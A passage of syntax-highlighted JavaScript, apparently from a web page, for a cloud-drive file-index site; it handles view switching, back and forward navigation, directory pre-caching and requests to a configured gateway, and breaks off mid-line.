class="language-javascript">            <span class="keyword">if</span> (display === <span class="string">&#x27;preview&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.list-header&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#file-list&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.markdown-body&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.password&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;initial&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (display === <span class="string">&#x27;encrypted&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.list-header&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#file-list&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.markdown-body&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.password&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;initial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#readme&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> content = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview .content&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (content) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview .content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.list-header&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;initial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#file-list&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;initial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.markdown-body&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.password&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#readme&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> content = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview .content&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (content) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.preview .content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">switchBackForwardStatus</span>(<span class="params">path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (path) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">deepest</span> = path;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">root</span> !== <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">backable</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;arrow-back&#x27;</span>).<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;black&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">backable</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;arrow-back&#x27;</span>).<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;rgb(218, 215, 215)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">deepest</span> !== <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">forwardable</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;arrow-forward&#x27;</span>).<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;black&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">forwardable</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;arrow-forward&#x27;</span>).<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;rgb(218, 215, 215)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">back</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">backable</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">preview</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">fetchFileList</span>(<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> former = (<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">let</span> formerEndIndex = <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span>.<span class="title function_">substring</span>(<span class="number">0</span>, formerEndIndex);</span></span><br><span class="line"><span class="language-javascript">                &#125;)();</span></span><br><span class="line"><span class="language-javascript">                former = former || <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">fetchFileList</span>(former);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">switchBackForwardStatus</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// console.log(window.backFordwardCache);</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">forward</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">forwardable</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> current = <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span> === <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span> ? <span class="string">&#x27;&#x27;</span> : <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> subLength = current ? current.<span class="property">length</span> : <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> later = current + <span class="string">&#x27;/&#x27;</span> +</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">deepest</span>.<span class="title function_">substring</span>(subLength).<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetchFileList</span>(later);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">switchBackForwardStatus</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// console.log(window.backFordwardCache);</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">preCache</span>(<span class="params">files, level</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (level &gt; <span class="number">2</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            files.<span class="property">files</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> parent = files.<span class="property">parent</span> === <span class="string">&#x27;/&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : files.<span class="property">parent</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> path = parent + <span class="string">&#x27;/&#x27;</span> + file.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!file.<span class="property">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// console.log(&#x27;caching &#x27; + path + &#x27;, level &#x27; + level);</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">sendRequest</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">method</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">url</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">api</span>.<span class="title function_">formatPayload</span>(path),</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">headers</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">const</span> files = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, files);</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">preCache</span>(files, level + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">false</span>)</span></span><br><span class="line"><span class="language-javascript">                    );</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>() === <span class="string">&#x27;md&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// console.log(&#x27;caching &#x27; + path + &#x27;, level &#x27; + level);</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">sendRequest</span>(<span class="string">&#x27;GET&#x27;</span>, file.<span class="property">url</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="function"><span class="params">text</span> =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, text), <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">false</span>));</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">preCacheCheck</span>(<span class="params">cache, path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            cache.<span class="property">files</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> prefix = path === <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span> ? <span class="string">&#x27;&#x27;</span> : path;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> nextPath = prefix + <span class="string">&#x27;/&#x27;</span> + file.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> pathCache = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(nextPath);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!file.<span class="property">url</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (!pathCache &amp;&amp; pathCache !== <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// console.log(&#x27;inner caching &#x27; + nextPath);</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(nextPath, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">sendRequest</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">method</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">url</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">window</span>.<span class="property">api</span>.<span class="title function_">formatPayload</span>(nextPath),</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">headers</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                                <span class="keyword">const</span> files = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span></span><br><span class="line"><span class="language-javascript">                                <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(nextPath, files);</span></span><br><span class="line"><span class="language-javascript">                                <span class="title function_">preCache</span>(files, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">                            &#125;,</span></span><br><span class="line"><span class="language-javascript">                            <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(nextPath, <span class="literal">false</span>)</span></span><br><span class="line"><span class="language-javascript">                        );</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>() === <span class="string">&#x27;md&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (!pathCache &amp;&amp; pathCache !== <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// console.log(&#x27;inner caching &#x27; + nextPath);</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(nextPath, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">sendRequest</span>(<span class="string">&#x27;GET&#x27;</span>, file.<span class="property">url</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="function"><span class="params">text</span> =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(nextPath,</span></span><br><span class="line"><span class="language-javascript">                            text), <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(nextPath,</span></span><br><span class="line"><span class="language-javascript">                                <span class="literal">false</span>));</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">fetchFileList</span>(<span class="params">path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// console.log(&#x27;fetching &#x27; + path);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> loading = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.loading-wrapper&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            loading.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;initial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">preview</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">backFordwardCache</span>.<span class="property">current</span> = path;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> cache = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(path);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (cache === <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> cacheWaitFileListFetch = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    cache = <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">get</span>(path);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> cache === <span class="string">&#x27;object&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">renderPage</span>(<span class="literal">null</span>, cache);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">preCacheCheck</span>(cache, path);</span></span><br><span class="line"><span class="language-javascript">                        <span class="built_in">clearInterval</span>(cacheWaitFileListFetch);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cache === <span class="literal">false</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="built_in">clearInterval</span>(cacheWaitFileListFetch);</span></span><br><span class="line"><span class="language-javascript">                        loading.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        loading.<span class="property">innerText</span> = <span class="string">&#x27;Failed!&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                            loading.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            loading.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;white&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                            loading.<span class="property">innerText</span> = <span class="string">&#x27;Loading..&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                        &#125;, <span class="number">2000</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;, <span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cache) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">renderPage</span>(<span class="literal">null</span>, cache);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">preCacheCheck</span>(cache, path);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">fileCache</span>.<span class="title function_">set</span>(path, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">sendRequest</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">method</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">url</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="title function_">formatPayload</span>(path),</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">headers</span>,</span></span><br><span class="line"><span class="language-javascript">                    renderPage</span></span><br><span class="line"><span class="language-javascript">                );</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">title</span> = <span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">SITE_NAME</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.site&#x27;</span>).<span class="property">textContent</span> = <span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">SITE_NAME</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">api</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">root</span>: <span class="string">&#x27;/&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">SCF_GATEWAY</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">formatPayload</span>: <span class="function">(<span class="params">path, passwd</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="string">&#x27;?path=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(path) +</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;&amp;encrypted=&#x27;</span> + <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">accessToken</span>.<span class="property">encrypted</span> +</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;&amp;plain=&#x27;</span> + <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">accessToken</span>.<span class="property">plain</span> +</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">&#x27;&amp;passwd=&#x27;</span> + passwd;</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">backFordwardCache</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">root</span>: <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">deepest</span>: <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">current</span>: <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">backable</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">forwardable</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">preview</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">fileCache</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> initialPath = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>).<span class="title function_">get</span>(<span class="string">&#x27;path&#x27;</span>) || <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">root</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">IS_CF</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">accessToken</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">encrypted</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">plain</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">fetchFileList</span>(initialPath);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">addBackForwardListener</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">sendRequest</span>(<span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">method</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">api</span>.<span class="property">url</span> + <span class="string">&#x27;?accessToken&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span 